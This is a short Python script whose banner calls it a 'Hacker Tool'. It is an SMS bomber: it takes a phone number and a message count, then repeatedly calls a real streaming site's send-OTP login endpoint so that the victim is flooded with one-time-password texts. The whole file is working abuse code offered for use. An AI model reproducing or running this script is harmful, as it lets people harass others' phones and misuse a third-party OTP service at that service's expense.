import os
from urllib import request
import time

os.system('clear')

print("""██████╗░██╗░░░░░░░██╗░█████╗░██████╗░░█████╗░███╗░░██╗██╔════╝░██║░░██╗░░██║██╔══██╗██╔══██╗██╔══██╗████╗░██║╚█████╗░░╚██╗████╗██╔╝███████║██████╔╝██║░░██║██╔██╗██║░╚═══██╗░░████╔═████║░██╔══██║██╔═══╝░██║░░██║██║╚████║██████╔╝░░╚██╔╝░╚██╔╝░██║░░██║██║░░░░░╚█████╔╝██║░╚███║╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░░╚═╝╚═╝░░░░░░╚════╝░╚═╝░░╚══╝#################################################################
✘✘Hello World My Name is ✪Mahibull✪
☞☞Hacker Tool☞☞
""")

phone=input("Enter phone Namber :")
sms=int(input("SMS quantity :"))

url ="https://www.bioscopelive.com/bn/login/send-otp?phone=88"+phone+"&operator=bd-otp"

for a in range(sms):
	request.urlopen(url)
	print(str(a+1)+"sms send")
	time.sleep(30)